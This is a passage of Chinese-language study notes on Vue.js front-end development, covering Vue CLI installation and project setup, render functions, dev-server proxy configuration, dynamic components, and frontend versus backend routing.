        </v-card-actions>
      </v-card>
    </v-dialog>
  </div>
</template>

<script>
export default {
  name: "DialogChildTest",
  data () {
    return {
      dialog: false,
    }
  },
  methods: {
    eventHandler(eventName, flag) {
      this.$emit(eventName, flag)
    }
  }
}
</script>
```

<br><br>

# Vue-Cli 脚手架的介绍和安装
如果只是简单写几个vue的demo程序, 那么不需要vue cli, 如果是在开发大型项目, 那么你需要并且必然需要使用vue cli

使用Vue.js开发大型应用时, 我们需要考虑代码目录结构, 项目结构和部署, 热加载, 代码单元测试等事情

如果每个项目都要手动完成这些工作, 那么无疑效率比较低效, 所以通常我们会使用一些脚手架工具来帮助完成这些事情

<br>

### Cli是什么意思
command line interface, 翻译为命令行界面, 但是俗称脚手架(在命令行输出几个简单的命令就会生成想要的结构)

vue cli是一个官方发布vue.js项目脚手架, 使用vue-cli可以快速搭建vue开发环境以及对应的webpack配置

脚手架最重要的就是生成webpack配置

<br>

### Vue cli的使用前提 是安装nodejs
node环境要求在8.9以上

<br>

### Vue cli也要求安装webpack
因为脚手架会帮我们生成webpack配置

<br>

### Vue Cli的使用
现在仅在学习阶段了解到了 cli有2 3两个版本, 但在cli3上用cli2的方式初始化项目是不行的, 在学习的过程中 我们装了3并且也下载了旧版本的2

安装vue脚手架 一般不需要本地安装 全局就可以了
```s
cli.vuejs.org
```

<br>

### 全局安装脚手架
```
npm install -g @vue/cli
vue --version
```

安装成功后可以使用 vue 命令 可以在终端查看是否安装成功 比如 

```js 
npm install -g @vue/cli@3.2.1

// 如果安装出错 我们在后面加上 --force
npm install -g @vue/cli@3.2.1 --force

// 上面安装的是cli3 我们再3的基础上也是可以使用脚手架2的, 在3的基础上拉一个模板就可以使用脚手架2了
```

<br>

### cli2 3 都能使用的安装方式
```s
npm install -g @vue/cli-init

# 上面安装的是cli3, 如果需要想按照cli2的方式初始化项目是不可以的 我们要拉取 2.x 模板(旧版本) 运行下面命令拉取旧版本 这样操作后 后面就可以既用cli2 也有cli3
```

<br>

### 通过脚手架创建项目的命令
切换我们要创建vue项目的目录后再使用命令创建项目
在创建项目的时候尽可能的回避掉主流库的名字

<br>

### cli4 创建项目的指令
```
npx vue create 项目名
```

<br>

### cli3 创建项目的指令
```
vue create 项目名
```

<br>

### cli2 创建项目的指令
```
vue init webpack 项目名
```

<br>

### 扩展
淘宝镜像 输入一行命令就可以
```
npm config set registry https://registry.npm.taobao.org
```

```s
"lint": "vue-cli-service lint"
# 该命令是把我们写过的所有代码进行检查 一般不这么干
```

<br><br>

# Vue Cli2 初始化项目的过程
在根目录下使用命令  
```
vue init webpack vuecli2learning  创建项目
```

```s
Project name (vuecli2learning) 

Project description (A Vue.js project)
# 描述信息 : 默认是括号里面的

Author (slnn2080 <xl63864807@163.com>)
# 默认作者: 它会自动读取git上配置的东西

Vue build (Use arrow keys)
```

<br>

### Runtime + Compiler: recommended for most users
```
Runtime-only: about 6KB lighter min+gzip, but templates (or any Vue-specific HTML) are ONLY 
allowed in .vue files - render functions are required elsewhere
```

之后构建项目的时候 用哪一个来进行构建是用Runtime + Compiler? Runtime-only? 

可以用上下方向键来选择 项目开发中更多的是使用 runtime-only

使用runtime的优势 会比上面的小6kb 这个的运行效率更高 我们先暂时选择上面的

<br>

```
Install vue-router? (Y/n) 
```

是否要安装路由大型项目的时候都会使用vue全家桶(vuecore+vue-router+vuex)  
我们暂时不安装, 为了方便学习


```
Use ESLint to lint your code? (Y/n) 
```

是否使用eslint 如果上面选择的是y会让你选择一种规范

<br>

### Standard (https://github.com/standard/standard) 标准规范
```
Airbnb (https://github.com/airbnb/javascript)       
none (configure it yourself)
```

```
Set up unit tests (Y/n)     
```

单元测试 这里需要依赖一些第三方的框架

```
Setup e2e tests with Nightwatch? (Y/n) 
```

端到端测试, 它会写一个自动化测试框架的 这里想让你依赖于Nightwatch

Nightwatch会结合selenlum 它俩配合可以写出一套端到端的代码, 项目可以在浏览器上自动化测试, 它可以自动操作浏览器 比如按钮的点击等, 就不需要手动的去点击测试了

最后一步是问以后管理项目是用npm 还是用 yarn

<br><br>

# Vue Cli2 目录结构解析 sudo
cli3以上据说没有build和config文件夹了

```s
|- build          # webpack相关的配置
|- config         # webpack配种中使用的变量
|- node_modules
|- src
  |- assets       # 资源放在这里 图片 css等
  |- components
  App.vue
  main.js

|- static
# (在这里放一些静态的资源 放在这里面的资源会原封不动的复制到dist文件夹里面放在src里面的文件会根据limit还判断是否转换但是放到这里面的文件不会转换原封不动的会复制到dist文件夹中)         
                  
  .gitkeep
  # (加上这个文件的话 不管文件夹是否为空都上传到服务器)

.babelrc
# (如果我们安装包的时候安装的是 babel-preset-env 会要求单独有一个babelrc文件 这里面写相关的配置)

.editorconfig
# (对代码做一些统一 缩进的风格等 换行等 项目正规的话肯定有这个文件)

.eslintignore
# (有些时候我们再写代码的时候可能不规范 但是我想对一些文件进行忽略就是不要针对这个文件做检查了)

.eslintrc.js
# (代码检测配置的相关东西)

.gitignore
# (有些文件不需要上传到服务器, 我们就可以写在这里面 忽略的意思)

.postcssrc.js
# (在css转化的时候配置的一个东西)

index.html
# (index模板, 打包的时候会根据这个模板在dist文件夹中生成index.html文件)

package.json
package-lock.json
README.md
```

<br>

**对babelrc的解析:**
```json
{
  "presets": [
    ["env", {
      "modules": false,
      "targets": {

        // babel的主要作用就是把es6转换为es5, 哪些语法转哪些语法不转呢? 当我们适配浏览器的时候适配这些就可以了 市场份额>1%的 这些浏览器我们适配 并且是最后的两个版本 ie<=8就不用考虑了
        "browsers": ["> 1%", "last 2 versions", "not ie <= 8"]
      }
    }],

    // es有很多的阶段0-5 我们现在转化的代码只针对2这个阶段
    "stage-2"
  ],

  // 转换过程中依赖的插件
  "plugins": ["transform-vue-jsx", "transform-runtime"]
}
```
  
<br>

读取上面结构的思路 从 package.json开始找 看看执行命令
```js 
"dev": "webpack-dev-server --inline --progress --config build/webpack.dev.conf.js",

// npm run build 打包项目 最终会执行build/build.js文件
"build": "node build/build.js"
```

<br>

build.js 代码中 我们抽取部分解释
```js 
const rm = require('rimraf');
const webpackConfig = require('./webpack.prod.conf')


// rm是removies的缩写 它是要执行命令去删除原来打包过的dist文件夹, 意思是如果是第二次执行 npm run build的时候 它会将之前打包的dist文件夹删除一下, 然后再通过webpack配置一些东西


rm(path.join(config.build.assetsRoot, config.build.assetsSubDirectroy), err => {
if (err) throw err
// 上面的地方是删除dist文件夹 如果有异常抛出异常


// 如果没有异常在这里找webpack的相关配置 根据相关的配置进行打包
// 这个webpack的配置 ./webpack.prod.conf 在这里

webpack(webpackConfig, (err, stats) => {
  spinner.stop()
  if (err) throw err
  process.stdout.write(stats.toString({
    colors: true,
    modules: false,
    children: false, // If you are using ts-loader, setting this to true will make TypeScript errors show up during build.
    chunks: false,
    chunkModules: false
  }) + '\n\n')

  if (stats.hasErrors()) {
    console.log(chalk.red('  Build failed with errors.\n'))
    process.exit(1)
  }

  console.log(chalk.cyan('  Build complete.\n'))
  console.log(chalk.yellow(
    '  Tip: built files are meant to be served over an HTTP server.\n' +
    '  Opening index.html over file:// won\'t work.\n'
  ))
})
```

<br><br>

# 分析脚手架结构
当我们执行完 ``npm run serve`` 命令之后 它直接就会去执行 main.js 文件

<br>

### 分析 main.js 入口文件
该文件是整个项目的入口文件

```js 
import Vue from 'vue'               // 脚手架会自动安装vue
import App from './App.vue'         // 引入所有组件的父组件

Vue.config.productionTip = false    // 关闭 vue的生产提示

new Vue({
  render: h => h(App),              // 将App组件放入容器中
}).$mount('#app')
```

<br>

### 分析 html 文件
```html
<!-- 就是public的路径 -->
<%= BASE_URL %> 
```

```html
<head>
  <meta charset="utf-8">

  <!-- 针对ie浏览器的特殊配置 让ie浏览器以最该的渲染级别渲染页面 -->
  <meta http-equiv="X-UA-Compatible" content="IE=edge">

  <meta name="viewport" content="width=device-width,initial-scale=1.0">

  <!-- 引入 页签图标  -->
  <link rel="icon" href="<%= BASE_URL %>favicon.ico">

  <!-- 它会去package.json文件中 找项目的名字做为网站的标题 -->
  <title><%= htmlWebpackPlugin.options.title %></title>
</head>

<body>
  <div id="app"></div>
</body>
```

<br>

### Vue中的render函数
以前我们在研究非单文件组件的时候没有接触过 render 配置项 这里我们就来研究下render配置项是干什么的

之前我们要是使用组件 第3步 要调用组件标签是么 或者需要在 div#root 里面调用 或者 我们需要在 App组件里面写上 template配置项 在里面调用 

但是我们在使用脚手架后 不用再div#root 和 template 中调用组件标签 而是通过render函数将组件渲染到页面上

<br>

### **<font color="#C2185B">render: h => h(App)</font>**  
render是一个函数 该函数vue帮我们调用的 它必须有一个返回值 它的完整写法是

该函数能够接收到参数 createElement 参数的类型也是 function 我们可以借助这个参数函数渲染内容
```js 
render(createElement) {

  // 把创建好的值 返回去 
  return createElement('h3', '你好啊')
}
```

<br><br>

# runtime-compiler 和 runtime-only 的区别
我们在实际的开发中选runtime-only就可以了  

runtime-only比runtime-compiler要轻代码量少, 由于runtime-only的执行过程也比runtime-compiler少, 性能也就越高

我们看下runtime-compiler 和 runtime-only 的区别, 从代码上直观的观察它们的区别仅在main.js里面

<br>

### runtime-compiler的使用方式
将App.vue文件(主组件)导入main.js文件中 在Vue实例中注册App组件 注册后使用App组件, 插入任意位置  

<br>

代码如下:
```js 
import App from './App'

new Vue({
  el: '#app',
  components: { App },
  template: '<App/>'
})

// 这种方式在vue会经过下面的处理:
template -- ast -- render -- vdom -- UI
```

<br>

### runtime-only的使用方式
将App.vue文件(主组件)导入main.js文件中  
only在导入app后并没有在实例中进行注册, 它只用的render函数

注意: 这里没有template属性, 直接就是render函数

```js 
import App from './App'

new Vue({
  el: '#app',
  render: h => h(app)
})

// 这种方式在vue会经过下面的处理:
render -- vdom -- UI
```

<br>

- **template -- ast -- render -- vdom -- UI**  
- **render -- vdom -- UI**  

<br>

**我们对这个过程进行下解析:**
```
执行过程图解
                        解析             编译
vm.options:template -- parse -- ast -- compiler -- render()
                                                      ↓
                                                  virtual dom
                                                      ↓
                                                      UI
```

<br>

我们在使用Vue开发的时候, html代码都是写在一个模板里的(``<template>``)
```html
<template>内容内容</template>
```

<br>

当把``<template>``模板传给vue的时候, vue会把``<template>``保存在vue实例下的options属性里, 然后vue会对``<template>``进行解析

解析成ast(抽象语法树), 然后vue会对抽象语法树(ast)进行编译(compiler), 

编译成render函数, 然后vue会通过render函数把对应的``<template>``转换为virtual dom(虚拟dom),

然后从render函数创建一些对应的dom节点形成一个虚拟dom树, 有了虚拟dom树后再渲染成真实的dom也就是最终显示在界面(ul)上的东西 

<br>

也就是说:

**runtime-compiler的话 内部执行过程是:**  
```
template -- ast -- render -- vdom -- UI
```

<br>

**runtime-only的话 内部执行过程是:**  
```
render -- vdom -- UI
```

<br>

从上面可以看出 第一种比第二种方式多了对 template -- ast 这个部分的处理逻辑
而compiler就是用来处理这部分逻辑的, 它会将 ``<template>`` 转换为 ast

也就是说以后我们在项目开发的时候都选择 runtime-only

<br><br>

# runtime-only 的 render函数
上面说了compiler多了哪部分的处理逻辑, 接下来我们研究下render函数实现了哪些功能

我们先从代码上直观的观察下render函数 
```js
render: h => h(app)
```

```js 
import App from './App'

new Vue({
  el: '#app',
  render: h => h(app)
})

// 这里runtime-only直接用render函数将app渲染出来
```

```js
render: h => h(app) 

// 可以还原成

render: function(createElement) {
  return createElement('h2', {class:'box'}, ['hellow']);
}
```

<br>

我们先说下结果, 通过render函数创建的标签会替换掉index.html中的
```html
<div id="#app"></div>
```

<br>

### 解析render函数:
render函数中的参数h 也是一个函数 名字为 createElement函数
那我们就先看下 createElement函数

### **<font color="#C2185B">createElement('标签', {标签的属性}, [标签里面的内容])</font>**  

<br>

### createElement() 普通用法:
```js 
// 比如我们可以通过 createElement() 创建一个 <h2>
createElement('h2', {class:'box'}, ['hello'])
↓
<h2 class='box'>hello</h2>
```

<br>

在以前的学习中我们知道 页面中的 
```html
<div id="#app"></div> 

<!-- 部分会被 <template> 中内容替换掉-->
```

<br>

如果我们使用render函数, ``<div id="#app"></div>`` 部分会被render函数创建的标签替换掉

也就是说如果我们写了这样的代码最终index.html中
```html
<div id="#app"></div> 

<!-- 会被替换为  -->
<h2 class='box'>hello</h2>
```

<br>

createElement还可以写的更复杂一些, 比如我们可以在``<h2>``标签内部继续创建新的内容
```js
createElement('h2', {class:'box'}, ['我是h2的内容', createElement('button', ['按钮'])])
```

<br>

既然参数3代表着h2标签内的内容, 同时还是个数组, 代表我还可以传递其它的东西进去, 所以我又传递了一个createElement函数, 创建了一个按钮 

<br>

### createElement() 特殊用法:
传入组件: ``<div id="#app"></div>`` 会被替换为 传入的组件
```js 
// 以前我们创建组件的时候 我们可以这样先创建一个变量里面写上组件内容, 然后在实例中注册
const cpn = {
  template: `
    <div>{{message}}</div>
  `,
  data() {
    return {
      message: '我是组件'
    }
  }
}

// 现在我们可以把这个组件传入 render函数里面, 传入render函数里面, 最终效果跟我们传统创建组件和使用组件的效果差不多
  
// 既然我们能传递自己创建的组件cpn 同理也能传入我们导入进来的App组件 
render: function(createElement) {
    return createElement(App);
}
// 通过这种方式会省略 将 template解析为ast的过程 性能会更好 所以一般我们开发的时候都会选择runtime-only

// 我们之所以可以这样写就是因为render函数中的形参h 可以直接传入一个组件
```

<br>

那如果我们选择了 runtime-only 的模式, 组件(.vue文件)中的template怎么办? 它就不用被解析了么?  
换句话说.vue文件中的template是由谁处理的呢?

答案是: vue-template-compiler

<br>

之前我们装过vue-loader和vue-template-compiler两个文件

- vue-loader: 用来加载vue文件
- vue-template-compiler: 用来解析.vue文件的 它就是将.vue文件的template解析成render函数的

<br>

有了vue-template-compiler后, 它会将.vue文件中的template部分解析成render函数(也就是一个普通的对象), 所以我们在main.js引入的时候, 这个普通对象里面没有包含template信息, 这个是开发时依赖, 也就是说所有组件中的template都被解析成普通对象了

<br><br>

# 修改脚手架的默认配置
vue脚手架隐藏了所有webpack的相关配置 若想查看具体的webpack配置 需要执行

```s
vue inspect > output.js
```

该命令会把所有的webpack代码整理成一个js文件供我们查看 仅是查看不是修改

<br>

### 在package文件同级的情况下 创建 vue.config.js 文件
下面的所有配置都在 这个文件中 书写规则 在该文件里面创建好的规则 最终会和webpack里面的配置进行合并

<br>

### 个性化的定制脚手架
那如果我就是想改一些webpack底层配置好的文件怎么办?  
```s
https://cli.vuejs.org/zh/config/
```

在上面的网站中复制对应的内容 放在 vue.config.js 文件中 重启脚手架

<br>

### 关闭语法检查
```s
https://cli.vuejs.org/zh/config/#lintonsave
```

```js 
module.exports = {
  lintOnSave: false
}
```

<br>

### 配置代理服务器
我们在解决跨域的问题的时候 需要配置代理服务器

下面简单说下 代理服务器开启的方式:
1. nginx
2. 借助vue-cli

<br>

### 方式1: Vue项目中配置代理:
```s
https://cli.vuejs.org/zh/config/#devserver-proxy
```

首先: 创建 vue.config.js 文件 复制下面代码 写上 目标服务器地址
```js 
module.exports = {
  devServer: {
    proxy: 'http://localhost:5000'
  }
}
```

然后: 脚手架要重新启动  

最后: 前端发送请求时候的url 要修改为代理服务器的地址(也就是前端项目所在的服务器地址)
```js 
// 比如我的脚手架开在8080 那么我发送请求的时候也要写
axios.get('http://localhost:8080')
```

<br>

### 注意:
代理服务器并不会把所有的请求都转发给5000服务器 而是请求的资源在8080本身就有的时候 它就不会把请求转发给5000服务器 而是拿着前端已经有的资源返给你

<br>

### 方式2: Vue项目中配置多个代理:
```js 
module.exports = {
  devServer: {

    proxy: {
      // 一套配置
      '/api1': {

        target: '<服务器地址url不用接具体接口>',
        pathRewrite: {'^/api1':''},
        ws: true,
        changeOrigin: true
      },

      // 另一套配置
      '/api2': {
        target: '<other_url>'
      }
    }
  }
}
```

```js
module.exports = {
  devServer: {
    proxy: {
      '/api': {
        target: "http://127.0.0.1:3333",
        pathRewrite: {'^/api':''},
        ws: true,
        changeOrigin: true
      }
    }
  }
}
```

<br>

### 注意:
- 前端发请求的时候 一定要http开头
- 我们要往前端所在的服务器端口号发请求 8080
- 主机地址:端口号 + /api + /接口
```js
axios.get("http://127.0.0.1:8080/api/word")
```

<br>

### proxy对象的属性:
**<font color="#C2185B">'/api'</font>**  
请求前缀 通过 url 匹配是否含有请求前缀 如果有 则走对应代理  
请求前缀 需要紧跟端口号 剩下的原来怎么写就怎么写
```
http://localhost:8080/students        原来
http://localhost:8080/api/students    现在
```
请求前缀最后还需要被脱掉 它只是用来匹配是否要走代理的一个标识

<br>

**<font color="#C2185B">pathRewrite: {'^/api': ''}</font>**  
用于脱掉请求前缀 它的值是一个对象 对象内部是 正则 和 替换内容  
将以 /api 开头的前缀 替换为 空

<br>

**<font color="#C2185B">target</font>**  
需要转发给哪个地址(目标服务器地址)

<br>

**<font color="#C2185B">ws: true</font>**  
websocket这也是前端和服务端的一种通信方式 用于支持websocket

<br>

**<font color="#C2185B">changeOrigin: true / false</font>**  
发送请求到服务器的时候 服务器会问代理服务器这次请求你来自于哪里  
true   说谎      我来自于5000(服务器所在地址)  
false  不说谎    我来自于8080(前台所在地址))

<br>

**注意:**  
4 和 5 默认不写也是true

<br><br>

# 动态组件 ``<component :is="">``

### 应用场景
tabs选项卡下 点击不同的tabs按钮展示不同的组件

<br>

### 作用:
让多个组件使用同一个挂载点 并动态切换 这就是动态组件。 

有的时候 在不同组件之间进行动态切换是非常有用的 比如在一个多标签的界面里: 

```
-------     -------     -------
Home        Login       Categroy
--------------------------------

    组件区域 <component> 

--------------------------------
```

<br>

### ``<component :is="pageView">`` 元素
``<component>`` 的作用相当于 router-view 用于呈现组件的区域  

我们通过 :is 属性 绑定对应的组件 is属性的值是一个组件变量

比如完成上述的 点击tabs按钮展现不同的组件 可以这样
```js 
// 1. 引入组件
import Home from "./components/Child/Home.vue"
import Login from "./components/Child/Login.vue"
import Categroy from "./components/Child/Categroy.vue"


// 2. 在合适的位置使用 <component> 元素
<div id="app">
  <button @click="changePage">切换页面</button>
  <component :is="pageView"></component>
</div>


// 3. :is 这里我 绑定组件 我们动态的从组件数组中获取组件
data() {
  return {
    index: 0,
    arr: [Home, Login, Categroy], 
},

// :is 会绑定计算属性 从计算属性中得到具体的组件
computed: {
  pageView() {
    return this.arr[this.index]
  }
}

methods: {
  changePage() {
    this.index = (++this.index) % 3
  }
},
``` 

<br><br>

# eslint规范
- 末尾不能有多余分号
- 函数名和参数括号之间要有空格
- 函数定义后必须被调用
- 代码的缩进2个
- eslint希望末尾不要加分号

<br>

### 如果在脚手架中把定义好eslint关闭
config文件夹  -- index.js -- useEslint: false

<br><br>

# Vue Cli3 
cli3 与 cli2 版本有很大的区别

cli3 基于 webpack4打造, cli2 还是 webpack3

cli3的设计原则是"0配置", 移除的配置文件根目录下的build和config等目录

cli3提供了vue ui命令, 提供了可视化配置, 更加的人性化

移除了static文件夹, 新增了public文件夹, 并且index.html移动到public中

<br><br>

## Vue Cli3 初始化项目的过程 以及 目录结构

<br>

Please pick a preset: (Use arrow keys)

default (babel, eslint)
  
Manually select features

```s
# 选择配置
1. 默认配置, 默认的话会默认添加babel 和 eslint
2. 手动选择特性, 按空格选择特性 回车下一步
>(*) Babel
  ( ) TypeScript
  ( ) Progressive Web App (PWA) Support    
  ( ) Router
  ( ) Vuex
  ( ) CSS Pre-processors
  ( ) Linter / Formatter     检测代码用的eslint
  ( ) Unit Testing
  ( ) E2E Testing
```

<br>

? Where do you prefer placing config for Babel, PostCSS, ESLint, etc.? (Use arrow keys)

In dedicated config files

In package.json

? Save this as a preset for future projects? (y/N)
```js 
future 将来

需要不需要把上面的配置保存为一个个人项目 再次通过cli3创建的时候可以选择你自己配置好的项目

手动删除路径
c -- users -- admin -- vuerc -- prest
```

? Save preset as:
```js 
上面如果选择y的话, 会跳到这里 保存个什么名字
```

<br>

### 目录结构
```js 
|- node_modules

  // 相当于cli2的static, 这里面的东西会原封不动的复制到dist里
|- public
  favicon.ico
  index.html

// 源代码
|- src          
  |- assets
  |- components
  App.vue
  main.js

// 配置浏览器相关的东西大于市场份额的1% 最后两个版本 不考虑ie8
.browserslistrc 

// 忽略文件, 不想上传到服务器 不想给同事共享的话
.gitignore      
babel.config.js 

package.json
package-lock.json

README.md
```

<br>

### npm run serve
测试代码效果

<br>

### npm run build
打包文件      

<br>

### cli3中的 main.js
```js 
import Vue from 'vue'
import App from './App.vue'

// 在执行npm run build的时候会有一些提示信息 比如构建了什么东西 发布的时候可以选成true, 在终端那里会提示你在打包什么东西
Vue.config.productionTip = false

new Vue({
  render: h => h(App),
}).$mount('#app')

// 我们在使用el:'#app'挂载app的时候 内部其实还是在执行 $mount('#app') 两种写法都可以
```

<br><br>

# Vue Cli3 配置文件的查看和修改
在cli3中要想修改配置的话有三种方案

<br>

### 方式1: 启动配置服务器: 命令: vue ui
在终端里输入 vue ui的话就会启动一个本地服务, 它帮助我们管理很多的项目 会弹出来一个网页, 跑在本地服务器上面的  

<br>

**创建:**  
可以通过图形可视化创建一个项目

<br>

**导入:**  
我们可以通过这个选项导入我们的创建的项目, 然后左侧会出现菜单

<br>

**仪表盘:**  
- 插件    会显示当前装了什么插件  
- 依赖    这里还可以可视化的安装依赖  
- 配置    可视化的配置东西  

里面有css的预处理配置, 但是默认只编译css文件, postcss还需要额外的配置

<br>

**任务:**  
这里可以可视化的运行项目

<br>

### 方式2:
```
\node_modules\@vue\cli-service
```

这里面有个webpack.config.js 这里面导入了

```
const Service = require('./lib/Service')
```

所以我们去 ./(当前文件夹) /lib/Service.js 它把配置隐藏在这里了

<br>

### 方式3: vue.config.js
在项目的根目录下创建 vue.config.js 文件 文件名固定 通过下面的方式, vue会把我们手写的配置和隐藏起来的配置进行合并的
```js
module.exports = {

}
```

<br><br>

# 路由: 映射关系
路由是一个网络工程里面的术语, routing就是通过互联的网络把信息从原地址传输到目的地址的活动 简单的理解就是将信息从一个地方转发到另一个地方

<br>

上面的理解还是有些抽象 在生活中, 我们有没有听说过路由的概念? 路由器嘛, 路由器提供了两种机制 **路由和转送**

<br>

**路由:**  
决定数据包从来源到目的地的路径

<br>

**转送:**  
将输入端的数据转移到合适的输出端

<br>

**路由表:**  
路由中有一个非常重要的概念叫路由表 路由表本质上就是一个映射表, 决定了数据包的指向

猫会拉出一条网线插在路由器上, 然后我们就可以通过路由器上网, 每一台链接路由器的设备, 都会被分配到一个ip地址 
  
比如: 192.168.1.100, 而猫本身也会有一个ip地址  
猫本身的ip地址叫做公网ip 比如202.111.23.45, 作为网址中的唯一标识

由路由器给我们设备分配的ip叫做内网ip  
内网ip只有在当前的网络里面内网ip才是有效的, 平时我们看见的192.168.1.1之类都是用于配置内网ip地址的

互联网中的ip地址是唯一的指的是公网ip地址, 这个地址是永远不能重复的

比如 朋友给我发送一条 北京下雪了 它会通过双方的公网ip地址 把内容发送到我的路由器上, 然后通过映射表(内网ip和设备的mac地址关系的表)将信息发送到对应的设备上

<br><br>

# 前端渲染和后端渲染
说到这两个术语, 我们要从网络的发展史来说起

<br>

### 后端渲染
网页的渲染并不是在前端渲染出来的, 是后端那边通过一些特殊的技术在后台渲染好了, 而这个渲染的过程是在服务端渲染的, 也叫作服务端渲染

在很久以前开发网页的时候都是通过 html+css+jsp/php 后端渲染对于seo会比较好

我们简单的看看后端渲染的流程:

比如我们再地址栏上输入 www.taobao.com, 这个地址就会发送到服务器里面

早期的时候, 服务器拿到我们的地址, 会将地址进行解析看看我们要请求什么样的网页 服务器会对发送过来的地址进行判断, 比如判断出 哦~ 原来请求的是首页

服务器就会在后台这边通过jsp的技术, 会直接将要请求的网页写好(网页中包含了htmlcssjava的代码, java的代码的作用是从数据库中读取数据并将数据动态的渲染到页面中)

也就是说我们请求的页面在服务器里就已经是一个成品网页了, 然后将这个网页直接发送给浏览器端, 这个网页中的代码只有html和css

比如这时候我们在淘宝首页上点击了一个链接, 会跳转到另一个页面 这个页面也会发送给服务器 服务器也会对这个url进行解析, 然后服务器在后台 通过jsp等技术在后端再次渲染出一个页面, 直接传给前端, 前端展示最终的网页

当页面多的时候, 请求的url和后台渲染的页面会形成一个映射关系 比如
- taobao   --- 渲染出来的淘宝页面
- 淘宝男装  --- 渲染出来的淘宝男装页面
- 淘宝女装  --- 渲染出来的淘宝女装页面

这种映射关系的存储和处理是服务器在帮我们处理

<br>

### 后端路由
后端帮我们处理url和页面之间的映射关系的, 这种就叫做后端路由 就是看上述的映射关系是谁帮我们处理谁帮我们保存

早期的网站开发整个html页面是由服务器来渲染的, 然后直接生产渲染好对应的html页面返回给客户端进行展示

但是一个网站,这么多的页面服务器如何处理?   

一个页面有自己对应的网址, 就是url, url会发送到服务器, 服务器就会通过正则对该url进行匹配, 并且最后交给一个Controller进行处理

Controller进行各种处理, 最终生成html或者数据, 返回前端, 这就完成了一个io操作

<br>

上面的这种操作就是后端路由  

当我们页面中需要请求不同的路径内容时, 交给服务器来进行处理, 服务器渲染好整个页面, 并且将页面返回给客户端, 这种情况下渲染好的页面, 不需要单独加载任何的js和css, 可以直接交给浏览器展示, 这样也有利于seo的优化 

<br>

### 后端路由的缺点
- 一种情况是整个页面的模块由后端人员来编写和维护的  
- 一种情况是前端开发人员如果要开发页面, 需要通过php和java等语言来编写页面代码

而且通常情况下html代码和数据以及对应的逻辑会混在一起, 编写和维护都是非常糟糕的事情

<br><br>

## 前后端分离阶段
随着ajax的出现, 有了前后端分离的开发模式  
后端只提供api来返回数据, 前端通过ajax获取数据, 并且可以通过js将数据渲染到页面中

这样做最大的优点就是前后端责任的清晰, 后端专注于数据上, 前端专注于交互和可视化上, 并且当移动端(ios android)出现后, 后端不需要进行任何处理, 依然使用之前的一套api即可

<br>

### 前端渲染
浏览器中显示的网页中的大部分内容, 都是由前端的js代码在浏览器中执行, 最终渲染出来的网页 目前很多的网站依然采用这种模式开发

<br>

**前后端分离阶段:**  
后端只负责提供数据 不负责任何阶段的内容
```
                  静态资源服务器
      这里存储着我们部署到服务器上的所有网页的相关代码


客户端(浏览器)                    服务器              数据库
                            提供api接口的服务器

    html
    css                   ↗
    js   将包含ajax代码发送到
```

<br>

我们写好的代码其实都是部署到静态资源服务器

当我们输入了url后, 其实不是直接从服务器拿东西的而是从静态资源服务器里面拿, 而我们写的所有代码都是放在静态资源服务器里面的

从静态资源服务器里取得html css js到浏览器端, htmlcss代码浏览器可以直接渲染, js部分必须由浏览器来执行, js代码中会包含ajax请求, 浏览器执行到ajax请求后会将ajax中的url(api接口)发送 接口服务器中请求api相对应的资源

然后接口服务器将对应的数据返回到客户端(浏览器)上 浏览器端拿到大量的数据后, 通过js代码动态渲染到页面上

也就是我们现在网页的渲染不是在服务器端, 而是通过ajax请求回来的数据, 在浏览器端通过js代码渲染页面

<br>

### 单页面富应用阶段
其实spa最主要的特点就是在前后端分离的基础上加了一层前端路由, 也就是前端来维护一套路由规则
```
                    静态资源服务器
      这里存储着我们部署到服务器上的所有网页的相关代码


客户端(浏览器)        服务器         数据库
              提供api接口的服务器
```

<br>

url: jd_man.com  
它也会先去静态资源服务器获取jd_man.com的html css js文件  

htmlcss直接渲染到页面中, 然后浏览器执行js代码, js代码的ajax部分去接口服务器请求数据, 然后js部分负责把请求回来的数据动态渲染到页面中 这就是第二个阶段前后端分离(通过ajax)

下面我们再看看看第三个阶段, spa页面

<br>

### SPA 单页面富应用
simple page webapplication, 整个网页只有一个html页面, 只有一个页面怎么行呢? 比如即有首页又有关于等页面怎么办?

我们看看结构图:
``` 
  

                  静态资源服务器
                里面放着html+css+js


客户端浏览器      接口服务器(api服务器)     数据库
```

<br>

**在前后端分离阶段:**  
静态资源服务器里放着好几套html+css+js 每一套对应一个url页面, 我们开发的网站每一个网站对应着一套css html js

```
url1 -- > 一套 html css js
url2 -- > 一套 html css js
url3 -- > 一套 html css js
```

<br>

**在单页面富应用阶段:**  
静态资源服务器里只有一套 index.html css js 这一套里面有网站首页子页的所有信息

我们在浏览器中输入 url, 会从静态资源服务器中把 那一套html css js下载下来  
下载下来后并不会把html css js的内容渲染到页面中 而是根据情况, <font color="#C2185B">把对应的信息抽取出来 渲染到页面里</font>  

比如我们有三个按钮, 首页, 关于, 我的  

当我点击 **我的** 按钮时, 把我的的相关内容从html css js文件中抽离出来渲染到对应的位置 这样即使是一套html css js也形成了三个页面, 要达到这点, 就必须有 前端路由的支撑

<br>

### 前端路由
其实spa最主要的特点就是在前后端分离的基础上加了一层前端路由, 也就是前端来维护一套路由规则

前端路由中会配置一些映射关系, 当我点击一个按钮的时候会生成一个url

比如 我点击 **首页** 按钮, 就会生成一个 url:shouye.com/home

这时候注意, 不是像前后端分离阶段, 一旦生成url就会去静态资源服务器里请求一套htmlcssjs文件

但是前端路由不会, 它生成的url并不会去静态资源请求资源, 它只会通过js代码的判断去我们从静态资源服务器中请求下来的数据里把相对应的资源抽离出来渲染到页面中

比如 我们点击 **关于** 按钮, 就会生成一个 url:shouye.com/about
会根据这个url再去我们从静态资源服务器中请求下来的数据里 抽取一部分数据渲染到页面中

其实我们抽取的这一部分资源就是相当于vue的一个组件 比如我们之前学的webpack打包, 会把所有的组件打包在一个index.html中, 其实每一个组件就可以是一个页面, 我们把所有的组件打包在一个js文件中, 看起来是一个js, 其实这个js中包含了很多个东西

前端会自动监听浏览器 一旦发现生成的url是这个页面 就会马上去js文件这个大的资源中, 找到这个组件的相关东西在页面上进行一个渲染

也就是spa页面必须有前端路由做支撑, 而前端路由就是用于映射浏览器上生成的url和main.js中到底要渲染哪一个组件的映射关系

``` 
url1: www.sam.com/home    --- js组件中对应的部分
url2: www.sam.com/about   --- js组件中对应的部分
url3: www.sam.com/me      --- js组件中对应的部分
```

而上述的映射关系就是在前端管理所以这就叫做前端路由

<br>

### 前端路由的核心
改变url(在地址栏输入地址) **页面是不进行整体刷新的**, 如果重写了url 默认是会向服务器请求新的资源的

<br><br>

# url的hash 和 html5的history
